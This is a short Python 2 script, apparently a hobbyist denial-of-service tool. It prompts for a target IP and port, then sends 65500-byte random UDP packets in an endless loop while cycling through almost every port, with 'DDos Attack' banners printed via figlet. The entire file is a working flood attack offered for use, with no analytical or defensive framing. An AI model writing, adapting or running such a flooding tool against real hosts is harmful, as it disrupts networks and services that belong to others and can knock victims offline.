import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(65500)
#############

os.system("clear")
os.system("figlet DDos Attack")
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")

while True:
     sock.sendto(bytes, (ip,port))
     port = port + 1
     if port == 65534:
       port = 1

